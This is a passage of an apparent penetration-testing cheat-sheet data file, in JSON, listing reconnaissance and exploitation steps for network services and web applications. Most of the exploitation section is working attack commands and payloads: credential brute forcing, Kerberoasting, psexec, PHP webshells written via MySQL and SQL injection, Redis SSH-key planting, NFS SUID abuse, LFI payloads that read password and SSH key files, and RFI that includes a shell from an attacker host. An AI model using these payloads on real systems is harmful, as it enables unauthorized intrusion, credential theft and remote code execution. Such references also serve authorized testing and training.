          }
        ]
      },
      {
        "id": "recon-27",
        "name": "MongoDB Enumeration (27017)",
        "description": "MongoDB unauthenticated access and database discovery.",
        "commands": [
          {
            "desc": "Connect to MongoDB shell",
            "entries": [
              {
                "subdesc": "Check for unauthenticated access — MongoDB often has no auth enabled",
                "cmd": [
                  "mongo --host <TARGET_IP> --port 27017"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate MongoDB with nmap scripts",
            "entries": [
              {
                "subdesc": "Discover databases and collections via NSE scripts",
                "cmd": [
                  "nmap --script mongodb-info,mongodb-databases -p27017 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-28",
        "name": "Elasticsearch Enumeration (9200)",
        "description": "Index exposure and REST API checks on Elasticsearch.",
        "commands": [
          {
            "desc": "List all Elasticsearch indices via API",
            "entries": [
              {
                "subdesc": "Unauthenticated REST API often exposes all stored data",
                "cmd": [
                  "curl -s http://<TARGET_IP>:9200/_cat/indices?v"
                ]
              }
            ]
          },
          {
            "desc": "HTTP enum scan on Elasticsearch port",
            "entries": [
              {
                "subdesc": "Discover Elasticsearch endpoints and plugins via NSE scripts",
                "cmd": [
                  "nmap --script http-enum -p9200 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-29",
        "name": "Memcached Enumeration (11211)",
        "description": "Memcached information leakage checks.",
        "commands": [
          {
            "desc": "Retrieve Memcached server stats via netcat",
            "entries": [
              {
                "subdesc": "Check for unauthenticated access — Memcached rarely has auth enabled",
                "cmd": [
                  "echo stats | nc <TARGET_IP> 11211"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate Memcached with nmap info script",
            "entries": [
              {
                "subdesc": "Detect version and dump cached key statistics",
                "cmd": [
                  "nmap --script memcached-info -p11211 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-30",
        "name": "VNC Enumeration (5900)",
        "description": "VNC auth mechanism and display info checks.",
        "commands": [
          {
            "desc": "Enumerate VNC info and display title with nmap",
            "entries": [
              {
                "subdesc": "Detect VNC version and check for no-password auth",
                "cmd": [
                  "nmap --script vnc-info,vnc-title -p5900 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-31",
        "name": "Vulnerability Scan (Nmap NSE)",
        "description": "Run NSE vulnerability scripts against all discovered open ports.",
        "commands": [
          {
            "desc": "Run NSE vuln scripts against open ports",
            "entries": [
              {
                "subdesc": "Broad vulnerability scan — run after enumeration to check for known CVEs",
                "cmd": [
                  "nmap --script vuln -p<OPEN_PORTS> <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-32",
        "name": "Content Management Systems",
        "description": "Scan and enumerate common CMS platforms (WordPress, Drupal, Joomla) for vulnerabilities, plugins, themes, and users.",
        "commands": [
          {
            "desc": "WordPress – Basic Usage",
            "entries": [
              {
                "subdesc": "Enumerate vulnerable plugins, themes, and database exports",
                "cmd": [
                  "wpscan --url <target> --enumerate vp, vt, dbe"
                ]
              }
            ]
          },
          {
            "desc": "WordPress – Extended Enumeration",
            "entries": [
              {
                "subdesc": "Full scan with TLS bypass — enumerate plugins, themes, and users",
                "cmd": [
                  "wpscan --url <target> --disable-tls-checks --enumerate p --enumerate t --enumerate u"
                ]
              }
            ]
          },
          {
            "desc": "WordPress – Admin Editor (Reverse Shell)",
            "entries": [
              {
                "subdesc": "Appearance -> Theme Editor -> 404 Template — replace it with a malicious reverse shell!",
                "cmd": [
                  "Appearance -> Theme Editor -> 404 Template"
                ]
              }
            ]
          },
          {
            "desc": "Drupal – Basic Usage",
            "entries": [
              {
                "subdesc": "An alias has already been created for this.",
                "cmd": [
                  "droopescan scan drupal -u <target> --enumerate all"
                ]
              }
            ]
          },
          {
            "desc": "Joomla – Basic Usage",
            "entries": [
              {
                "subdesc": "An alias has already been set for this.",
                "cmd": [
                  "joomscan <target-ip>"
                ]
              }
            ]
          },
          {
            "desc": "Joomla – Specific Endpoint",
            "entries": [
              {
                "subdesc": "Target a specific Joomla endpoint for focused scanning",
                "cmd": [
                  "joomscan -u http://<target.com>/<end-point>"
                ]
              }
            ]
          },
          {
            "desc": "Joomla – Multiple Targets",
            "entries": [
              {
                "subdesc": "Batch scan multiple Joomla targets from a file",
                "cmd": [
                  "joomscan -m <targets>.txt"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-33",
        "name": "Subdomain & Virtual Host Enumeration",
        "description": "Discover subdomains and virtual hosts that may expose hidden web applications, admin panels, or dev environments on shared hosting.",
        "commands": [
          {
            "desc": "ffuf virtual host discovery",
            "entries": [
              {
                "subdesc": "Fuzz the Host header to find virtual hosts. Filter by response size (-fs) to exclude default pages.",
                "cmd": [
                  "ffuf -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.<DOMAIN>\" -mc 200,301,302 -fs <DEFAULT_SIZE>"
                ]
              }
            ]
          },
          {
            "desc": "gobuster vhost mode",
            "entries": [
              {
                "subdesc": "Use --append-domain to automatically append the base domain to each word in the wordlist.",
                "cmd": [
                  "gobuster vhost --append-domain --wordlist /usr/share/seclists/Discovery/DNS/namelist.txt -u http://<TARGET> | grep 'Status: 200'"
                ]
              }
            ]
          },
          {
            "desc": "gobuster DNS subdomain brute-force",
            "entries": [
              {
                "subdesc": "Resolves subdomains via DNS queries. Increase threads (-t) for faster scans.",
                "cmd": [
                  "gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 10 -d <DOMAIN>"
                ]
              }
            ]
          },
          {
            "desc": "Virtual host enumeration loop script",
            "entries": [
              {
                "subdesc": "Quickly test a list of potential vhosts by sending curl requests with different Host headers.",
                "cmd": [
                  "for sub in $(cat /usr/share/seclists/Discovery/DNS/namelist.txt); do echo \"Testing: $sub.<DOMAIN>\"; curl -s -o /dev/null -w \"%{http_code}\" -H \"Host: $sub.<DOMAIN>\" http://<TARGET_IP>; echo; done"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-34",
        "name": "Git Repository Enumeration",
        "description": "Detect and dump exposed .git directories from web servers. Analyze commit history for secrets, credentials, and sensitive configuration changes.",
        "commands": [
          {
            "desc": "Dump an exposed .git directory from a web server",
            "entries": [
              {
                "subdesc": "git-dumper reconstructs the full repo from a publicly accessible .git folder. Install: pip install git-dumper.",
                "cmd": [
                  "git-dumper http://<TARGET>/.git <LOCAL_OUTPUT_PATH>"
                ]
              }
            ]
          },
          {
            "desc": "Scan for secrets with Gitleaks",
            "entries": [
              {
                "subdesc": "Gitleaks scans for hardcoded credentials, API keys, and tokens in repos. Use 'dir' for local folders or 'git' for commit history.",
                "cmd": [
                  "gitleaks dir -v",
                  "gitleaks git -v"
                ]
              }
            ]
          },
          {
            "desc": "Review commit history for sensitive changes",
            "entries": [
              {
                "subdesc": "Check the git log for interesting commits, then diff between them to find removed passwords or config changes.",
                "cmd": [
                  "git log --oneline",
                  "git show <COMMIT_ID>",
                  "git diff <COMMIT_1> <COMMIT_2>"
                ]
              }
            ]
          },
          {
            "desc": "Grep through repository for keywords",
            "entries": [
              {
                "subdesc": "Search for passwords, tokens, connection strings, or other secrets in the codebase.",
                "cmd": [
                  "grep -r 'password\\|secret\\|token\\|api_key\\|connectionString' /path/to/git-directory"
                ]
              }
            ]
          },
          {
            "desc": "Common .git files to check manually",
            "entries": [
              {
                "subdesc": "If git-dumper fails, try fetching these files individually via curl.",
                "cmd": [
                  "/.git/config",
                  "/.git/packed-refs",
                  "/.git/HEAD",
                  "/.git/description",
                  "/.git/shallow"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-35",
        "name": "API Enumeration",
        "description": "Discover and enumerate API endpoints. API paths often follow /api_name/v1 or /api_name/v2 patterns. A 405 Method Not Allowed (instead of 404) means the endpoint exists but needs a different HTTP method.",
        "commands": [
          {
            "desc": "Gobuster with API pattern file",
            "entries": [
              {
                "subdesc": "Create a pattern file with lines like {GOBUSTER}/v1 and {GOBUSTER}/v2 to fuzz versioned API endpoints.",
                "cmd": [
                  "gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/big.txt -p <pattern_file>"
                ]
              }
            ]
          },
          {
            "desc": "Probe discovered API endpoints with curl",
            "entries": [
              {
                "subdesc": "Start with GET to check the response, then try POST/PUT if you get 405 Method Not Allowed.",
                "cmd": [
                  "curl -i http://<TARGET_IP>:<PORT>/users/v1",
                  "curl -i http://<TARGET_IP>:<PORT>/users/v1/admin"
                ]
              }
            ]
          },
          {
            "desc": "Register a new user via API (POST)",
            "entries": [
              {
                "subdesc": "Many APIs allow self-registration. Try including an admin key in the JSON body to escalate privileges.",
                "cmd": [
                  "curl -X POST http://<TARGET_IP>:<PORT>/users/v1/register -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test123\",\"email\":\"test@test.com\"}'",
                  "curl -X POST http://<TARGET_IP>:<PORT>/users/v1/register -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test123\",\"email\":\"test@test.com\",\"admin\":true}'"
                ]
              }
            ]
          },
          {
            "desc": "Authenticate and get JWT token",
            "entries": [
              {
                "subdesc": "Use the token from the login response in subsequent requests as a Bearer token or in the Authorization header.",
                "cmd": [
                  "curl -X POST http://<TARGET_IP>:<PORT>/users/v1/login -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"password\":\"test123\"}'"
                ]
              }
            ]
          },
          {
            "desc": "Change password via PUT/PATCH with JWT",
            "entries": [
              {
                "subdesc": "If you have a valid JWT, try changing another user's password by targeting their username in the URL.",
                "cmd": [
                  "curl -X PUT http://<TARGET_IP>:<PORT>/users/v1/admin/password -H 'Content-Type: application/json' -H 'Authorization: Bearer <JWT_TOKEN>' -d '{\"password\":\"newpass123\"}'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-36",
        "name": "Internal Network Scanning (Pivoting)",
        "description": "When you have a foothold on a compromised host, use these one-liners to discover other hosts and open ports on the internal network without uploading tools.",
        "commands": [
          {
            "desc": "Windows – Subnet host discovery (PowerShell)",
            "entries": [
              {
                "subdesc": "Pings each IP in a /24 subnet and shows which hosts are alive. Useful when nmap is not available on the target.",
                "cmd": [
                  "1..254 | ForEach-Object { $ip = \"<SUBNET>.$_\"; $result = Get-WmiObject Win32_PingStatus -Filter \"Address='$ip' AND Timeout=200\"; if ($result.StatusCode -eq 0) { Write-Host \"$ip is alive\" } }"
                ]
              }
            ]
          },
          {
            "desc": "Windows – Port scan (PowerShell)",
            "entries": [
              {
                "subdesc": "Scans all ports 1-1024 on a single target. Slow but works without any tools installed.",
                "cmd": [
                  "1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect(\"<TARGET_IP>\", $_)) \"TCP port $_ is open\" } 2>$null"
                ]
              }
            ]
          },
          {
            "desc": "Windows – Scan specific ports (PowerShell)",
            "entries": [
              {
                "subdesc": "Target high-value ports only for faster results during time-limited engagements.",
                "cmd": [
                  "@(21,22,25,53,80,88,135,139,389,443,445,636,1433,3306,3389,5432,5985,8080) | % { try { $t = New-Object Net.Sockets.TcpClient; $t.Connect(\"<TARGET_IP>\", $_); Write-Host \"Port $_ open\"; $t.Close() } catch {} }"
                ]
              }
            ]
          },
          {
            "desc": "Linux – Subnet host discovery (bash)",
            "entries": [
              {
                "subdesc": "Simple ping sweep using a for loop. Works on minimal Linux installs.",
                "cmd": [
                  "for i in $(seq 254); do ping -c 1 -W 1 <SUBNET>.$i | grep 'from' &; done; wait"
                ]
              }
            ]
          },
          {
            "desc": "Linux – Port scan (bash + netcat)",
            "entries": [
              {
                "subdesc": "Full port scan using netcat. Very slow for all 65535 ports — consider limiting the range.",
                "cmd": [
                  "for port in {1..65535}; do nc -zvw1 <TARGET_IP> $port 2>&1 | grep 'open'; done"
                ]
              }
            ]
          },
          {
            "desc": "Banner grabbing with netcat",
            "entries": [
              {
                "subdesc": "Connect to a port and read the service banner. Helps identify service versions without nmap.",
                "cmd": [
                  "nc -nv <TARGET_IP> <PORT>"
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 3: Exploitation ───────────────────────────── */
  {
    "id": "exploitation",
    "name": "Exploitation",
    "optional": false,
    "items": [
      {
        "id": "exploit-1",
        "name": "Exploit Lookup",
        "description": "Map services to known exploits via searchsploit, exploit-db, and Google.",
        "commands": [
          {
            "desc": "Using Searchsploit",
            "entries": [
              {
                "subdesc": "Map discovered services and versions to known public exploits in ExploitDB",
                "cmd": [
                  "searchsploit <SERVICE/VERSION>"
                ]
              }
            ]
          },
          {
            "desc": "Using SICAT exploit finder [https://github.com/justakazh/sicat]",
            "entries": [
              {
                "subdesc": "Search for vulnerabilities and exploits from multiple high-profile sources (ExploitDB, NVD NIST, CVE.org, Github). Install: git clone https://github.com/justakazh/sicat.git && cd sicat && pip install -r requirements.txt",
                "cmd": [
                  "sicat -k <SERVICE/VERSION>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-2",
        "name": "FTP Credential Attack (21)",
        "description": "Brute force/default creds on FTP.",
        "commands": [
          {
            "desc": "Brute Force FTP Credentials",
            "entries": [
              {
                "subdesc": "Use Hydra or Medusa to spray credentials against FTP. Try anonymous:anonymous first before brute forcing.",
                "cmd": [
                  "hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>",
                  "medusa -h <TARGET_IP> -u <USER> -P passwords.txt -M ftp"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-3",
        "name": "SSH Credential Attack (22)",
        "description": "Password spray and valid credential validation.",
        "commands": [
          {
            "desc": "Brute Force SSH & Validate Access",
            "entries": [
              {
                "subdesc": "Spray credentials with Hydra, then validate by connecting. Use -t 4 to limit threads and avoid lockouts.",
                "cmd": [
                  "hydra -L users.txt -P rockyou.txt ssh://<TARGET_IP>",
                  "ssh <USER>@<TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-4",
        "name": "SMTP Relay / VRFY Abuse (25/465/587)",
        "description": "Test relay misconfig and user enumeration.",
        "commands": [
          {
            "desc": "Test Open Relay & Enumerate Users",
            "entries": [
              {
                "subdesc": "Use swaks to test if the server relays mail for arbitrary domains. Use Nmap scripts to enumerate valid users via VRFY/EXPN/RCPT.",
                "cmd": [
                  "swaks --to test@domain.local --from attacker@domain.local --server <TARGET_IP>",
                  "nmap --script smtp-open-relay,smtp-enum-users -p25,465,587 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-5",
        "name": "IMAP/POP Mailbox Brute (110/143/993/995)",
        "description": "Mailbox auth attacks.",
        "commands": [
          {
            "desc": "Brute Force IMAP & POP3 Mailboxes",
            "entries": [
              {
                "subdesc": "Spray credentials against IMAP (143/993) and POP3 (110/995). Valid creds may yield emails containing passwords, internal URLs, or sensitive attachments.",
                "cmd": [
                  "hydra -L users.txt -P passwords.txt imap://<TARGET_IP>",
                  "hydra -L users.txt -P passwords.txt pop3://<TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-6",
        "name": "Windows: Kerberos AS-REP / Kerberoast (88)",
        "description": "Domain credential extraction via Kerberos.",
        "commands": [
          {
            "desc": "AS-REP Roasting & Kerberoasting",
            "entries": [
              {
                "subdesc": "GetNPUsers targets accounts with 'Do not require Kerberos pre-auth'. GetUserSPNs requests TGS tickets for service accounts — crack offline with hashcat.",
                "cmd": [
                  "impacket-GetNPUsers <DOMAIN>/ -dc-ip <TARGET_IP> -usersfile users.txt -format hashcat",
                  "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-7",
        "name": "RPC/SMB Null Session & Share Abuse (135/139/445)",
        "description": "Anonymous/domain share abuse paths.",
        "commands": [
          {
            "desc": "Null Session & Share Enumeration",
            "entries": [
              {
                "subdesc": "rpcclient with empty creds tests null session access. CrackMapExec enumerates accessible shares with valid domain credentials.",
                "cmd": [
                  "rpcclient -U \"\" -N <TARGET_IP>",
                  "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-8",
        "name": "SMB Remote Exec (445)",
        "description": "Command execution through SMB with valid creds/hash.",
        "commands": [
          {
            "desc": "Remote Execution via SMB",
            "entries": [
              {
                "subdesc": "PsExec uploads a service binary and executes as SYSTEM. SmbExec creates a service without uploading — stealthier. Both require admin creds or NTLM hash.",
                "cmd": [
                  "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
                  "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-9",
        "name": "Windows: LDAP Credentialed Abuse (389/636/3268/3269)",
        "description": "Enumerate AD abuse paths with valid creds.",
        "commands": [
          {
            "desc": "LDAP Queries & BloodHound Collection",
            "entries": [
              {
                "subdesc": "ldapsearch queries AD directly for users, groups, and policies. BloodHound.py collects the full AD graph for attack path analysis.",
                "cmd": [
                  "ldapsearch -x -H ldap://<TARGET_IP> -D \"<USER_DN>\" -w <PASS> -b \"dc=domain,dc=local\"",
                  "python3 bloodhound.py -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-11",
        "name": "MSSQL Command Execution (1433)",
        "description": "Leverage SQL Server to execute OS commands.",
        "commands": [
          {
            "desc": "Connect & Enable xp_cmdshell",
            "entries": [
              {
                "subdesc": "Authenticate with impacket-mssqlclient, then enable xp_cmdshell for OS command execution. Requires sysadmin role or sa credentials.",
                "cmd": [
                  "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
                  "EXEC sp_configure \"xp_cmdshell\",1;RECONFIGURE;EXEC xp_cmdshell \"whoami\";"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-14",
        "name": "Oracle Account/SID Abuse (1521)",
        "description": "Exploit weak Oracle credentials and misconfig.",
        "commands": [
          {
            "desc": "Oracle Brute Force & Full Audit",
            "entries": [
              {
                "subdesc": "ODAT (Oracle Database Attacking Tool) automates SID guessing, credential brute forcing, and privilege escalation. 'all' mode runs every available module.",
                "cmd": [
                  "odat passwordguesser -s <TARGET_IP> -d <SID>",
                  "odat all -s <TARGET_IP> -d <SID> -U <USER> -P <PASS>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-10",
        "name": "NFS no_root_squash Abuse (2049)",
        "description": "Exploit writable NFS exports for privesc foothold.",
        "commands": [
          {
            "desc": "Mount & Plant SUID Binary",
            "entries": [
              {
                "subdesc": "If no_root_squash is set on the export, root on the attacker can write SUID binaries that execute as root on the target.",
                "cmd": [
                  "mkdir /tmp/nfs",
                  "mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs",
                  "cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-12",
        "name": "MySQL UDF / File Write Abuse (3306)",
        "description": "Abuse FILE/UDF permissions on MySQL.",
        "commands": [
          {
            "desc": "Login & Write Webshell via OUTFILE",
            "entries": [
              {
                "subdesc": "Check secure_file_priv — if empty or set to a web directory, you can write a PHP webshell. UDF plugins allow OS command execution.",
                "cmd": [
                  "mysql -h <TARGET_IP> -u <USER> -p",
                  "SELECT @@secure_file_priv;",
                  "SELECT \"<?php system($_GET[c]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-17",
        "name": "RDP Password Spray (3389)",
        "description": "Credential attack and desktop access validation.",
        "commands": [
          {
            "desc": "Brute Force RDP & Connect",
            "entries": [
              {
                "subdesc": "Crowbar is purpose-built for RDP brute forcing (install: pip install crowbar). On success, use xfreerdp for full GUI access or add /cert-ignore for self-signed certs.",
                "cmd": [
                  "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C passwords.txt",
                  "xfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-13",
        "name": "PostgreSQL Command Exec (5432)",
        "description": "Use PostgreSQL feature abuse for command execution.",
        "commands": [
          {
            "desc": "Connect & Execute OS Commands",
            "entries": [
              {
                "subdesc": "COPY TO PROGRAM executes shell commands through PostgreSQL — requires superuser privileges. Can be used for reverse shells.",
                "cmd": [
                  "psql -h <TARGET_IP> -U <USER>",
                  "COPY (SELECT \"bash -c 'id'\") TO PROGRAM \"bash\";"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-15",
        "name": "Redis Unauthorized Write (6379)",
        "description": "Turn unauth Redis into persistence/RCE foothold.",
        "commands": [
          {
            "desc": "Write SSH Key via Unauthenticated Redis",
            "entries": [
              {
                "subdesc": "If Redis is exposed without auth, redirect the DB file to /root/.ssh/authorized_keys and write your public key. Also works for crontab or webshell writes.",
                "cmd": [
                  "redis-cli -h <TARGET_IP>",
                  "CONFIG SET dir /root/.ssh",
                  "CONFIG SET dbfilename authorized_keys",
                  "SET crack \"<PUBKEY>\"",
                  "SAVE"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-16",
        "name": "MongoDB Unauth Data Access (27017)",
        "description": "Exploit unauth MongoDB exposure.",
        "commands": [
          {
            "desc": "Connect & Dump Databases",
            "entries": [
              {
                "subdesc": "Default MongoDB installs have no auth. Connect directly and enumerate databases, collections, and sensitive documents.",
                "cmd": [
                  "mongo --host <TARGET_IP> --port 27017",
                  "show dbs",
                  "use admin",
                  "show collections"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-18",
        "name": "SQL Injection",
        "description": "Authentication bypass, UNION extraction, blind/time-based injection, and SQLmap automation.",
        "commands": [
          {
            "desc": "Basic Tests",
            "entries": [
              {
                "subdesc": "Try each in login fields, URL params, and POST body. Watch for error messages or behavioral changes",
                "cmd": [
                  "'",
                  "' OR 1=1-- -",
                  "' OR 1=1#",
                  "\" OR 1=1#",
                  "'OR '' = '",
                  "valid' or 1=1--+",
                  "valid' or 1=1#",
                  "valid\" or 1=1#"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate Columns",
            "entries": [
              {
                "subdesc": "Increment ORDER BY until error to find number of columns, then match with UNION SELECT NULLs",
                "cmd": [
                  "' ORDER BY 1-- //",
                  "' UNION SELECT NULL,NULL,NULL--"
                ]
              }
            ]
          },
          {
            "desc": "UNION Data Extraction",
            "entries": [
              {
                "subdesc": "Replace NULLs with column names once you know the count. Use information_schema to discover tables/columns",
                "cmd": [
                  "' UNION SELECT database(), user(), @@version, null, null -- //",
                  "' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //",
                  "' UNION SELECT null, username, password, description, null FROM users -- //"
                ]
              }
            ]
          },
          {
            "desc": "MySQL Enumeration Queries",
            "entries": [
              {
                "subdesc": "Run inside a SQL session or inject via UNION to gather server info and privileges",
                "cmd": [
                  "SELECT @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;",
                  "SHOW GRANTS;",
                  "SHOW VARIABLES;"
                ]
              }
            ]
          },
          {
            "desc": "UNION Webshell",
            "entries": [
              {
                "subdesc": "Requires FILE privilege and known writable web directory. Check secure_file_priv first",
                "cmd": [
                  "' UNION SELECT \"<?php system($_GET['cmd']);?>\", null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- //",
                  "<TARGET>/tmp/webshell.php?cmd=id"
                ]
              }
            ]
          },
          {
            "desc": "Blind Boolean",
            "entries": [
              {
                "subdesc": "Infer data one character at a time by observing TRUE/FALSE page differences. Use Burp Intruder Sniper/Cluster Bomb",
                "cmd": [
                  "' AND (SELECT 'a' FROM users LIMIT 1)='a",
                  "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m"
                ]
              }
            ]
          },
          {
            "desc": "Oracle Blind (SUBSTR)",
            "entries": [
              {
                "subdesc": "Oracle uses SUBSTR instead of SUBSTRING. Use Burp Cluster Bomb to iterate position and character",
                "cmd": [
                  "' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a"
                ]
              }
            ]
          },
          {
            "desc": "Time-Based Blind",
            "entries": [
              {
                "subdesc": "When no visible difference — use time delays to infer TRUE/FALSE conditions",
                "cmd": [
                  "' IF (1=1) WAITFOR DELAY '0:0:10';--",
                  "'||pg_sleep(10)--"
                ]
              }
            ]
          },
          {
            "desc": "SQLmap",
            "entries": [
              {
                "subdesc": "Use -r with a saved Burp request for complex injection points. --os-shell requires FILE priv",
                "cmd": [
                  "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -p id --dbs --batch",
                  "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -p id --dump",
                  "sqlmap -r request.txt -p <PARAM> --os-shell --web-root \"/var/www/html/tmp\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-19",
        "name": "Local File Inclusion (LFI)",
        "description": "Path traversal, PHP wrappers (filter, data, zip, zlib), log poisoning, and encoding bypasses.",
        "commands": [
          {
            "desc": "Directory Traversal",
            "entries": [
              {
                "subdesc": "Try multiple depths. Use ....// to bypass simple ../ stripping filters",
                "cmd": [
                  "../../../etc/passwd",
                  "....//....//....//etc/passwd",
                  "..%252f..%252f..%252fetc%252fpasswd"
                ]
              }
            ]
          },
          {
            "desc": "From Existent Folder",
            "entries": [
              {
                "subdesc": "Start traversal from a known valid directory to bypass path validation",
                "cmd": [
                  "/var/www/images/../../../etc/passwd"
                ]
              }
            ]
          },
          {
            "desc": "Null Byte (Only works in versions BEFORE PHP 5.3.4)",
            "entries": [
              {
                "subdesc": "Terminates the string early, bypassing appended extensions",
                "cmd": [
                  "../../../etc/passwd%00"
                ]
              }
            ]
          },
          {
            "desc": "URL Encoding Bypass",
            "entries": [
              {
                "subdesc": "Double-encode or use alternate UTF-8 representations to bypass WAF/filters",
                "cmd": [
                  "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                  "..%c0%af..%c0%af..%c0%afetc/passwd",
                  "..%252f..%252f..%252fetc/passwd"
                ]
              }
            ]
          },
          {
            "desc": "Path Truncation",
            "entries": [
              {
                "subdesc": "Exceed max path length (4096 Linux / 256 Windows) to truncate appended extensions",
                "cmd": [
                  "../../../etc/passwd/./././././././[...repeat to 4096+ chars]"
                ]
              }
            ]
          },
          {
            "desc": "PHP Filter (Base64)",
            "entries": [
              {
                "subdesc": "Read source code without execution. Decode the base64 output to see PHP source",
                "cmd": [
                  "php://filter/convert.base64-encode/resource=index.php"
                ]
              }
            ]
          },
          {
            "desc": "PHP Filter (ROT13)",
            "entries": [
              {
                "subdesc": "Alternative to base64 — use ROT13 to bypass keyword filters, then decode",
                "cmd": [
                  "php://filter/read=string.rot13/resource=index.php"
                ]
              }
            ]
          },
          {
            "desc": "PHP Zlib Wrapper",
            "entries": [
              {
                "subdesc": "Compress/decompress data streams — useful when other wrappers are blocked",
                "cmd": [
                  "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
                ]
              }
            ]
          },
          {
            "desc": "PHP Data Wrapper (RCE)",
            "entries": [
              {
                "subdesc": "Requires allow_url_include=On. Base64 variant bypasses WAF keyword detection",
                "cmd": [
                  "data://text/plain,<?php echo system('ls');?>",
                  "echo -n '<?php echo system($_GET[\"cmd\"]);?>' | base64",
                  "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
                ]
              }
            ]
          },
          {
            "desc": "PHP ZIP Wrapper",
            "entries": [
              {
                "subdesc": "Upload a zip-disguised-as-image containing a PHP payload, then include it",
                "cmd": [
                  "echo '<?php system($_GET[\"cmd\"]); ?>' > payload.php",
                  "zip payload.zip payload.php; mv payload.zip shell.jpg",
                  "zip://shell.jpg%23payload.php"
                ]
              }
            ]
          },
          {
            "desc": "Log Poisoning (Apache)",
            "entries": [
              {
                "subdesc": "Inject <?php system($_GET['cmd']); ?> in User-Agent header via Burp, then include the log file",
                "cmd": [
                  "<TARGET>/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami"
                ]
              }
            ]
          },
          {
            "desc": "Log Poisoning (Windows XAMPP)",
            "entries": [
              {
                "subdesc": "Same technique but with Windows log paths",
                "cmd": [
                  "<TARGET>/index.php?page=C:\\xampp\\apache\\logs\\access.log&cmd=whoami"
                ]
              }
            ]
          },
          {
            "desc": "Key Files",
            "entries": [
              {
                "subdesc": "Common LFI target files — read credentials, SSH keys, and system configs",
                "cmd": [
                  "/etc/passwd",
                  "/home/<user>/.ssh/id_rsa"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-20",
        "name": "Remote File Inclusion (RFI)",
        "description": "Remote file inclusion via HTTP/SMB. Requires allow_url_include enabled in php.ini.",
        "commands": [
          {
            "desc": "HTTP-Based RFI",
            "entries": [
              {
                "subdesc": "Host a PHP shell on your attacker machine and include it via the vulnerable parameter",
                "cmd": [
                  "http://<TARGET>/index.php?page=http://<LHOST>/shell.php"
                ]
              }
            ]
          },
          {
            "desc": "SMB-Based RFI",
            "entries": [
              {
                "subdesc": "Use UNC path to include a file from your SMB share — bypasses some HTTP URL filters",
                "cmd": [
                  "http://<TARGET>/index.php?page=\\\\<LHOST>\\shell.php"
                ]
              }
            ]
          },
          {
            "desc": "Attacker Setup",
            "entries": [
              {
                "subdesc": "Kali webshells: /usr/share/webshells/php/",
                "cmd": [
                  "python3 -m http.server 80"
                ]
              }
            ]
          },
          {
            "desc": "curl RFI",
            "entries": [
              {
                "subdesc": "Test RFI with command execution in one shot",
                "cmd": [
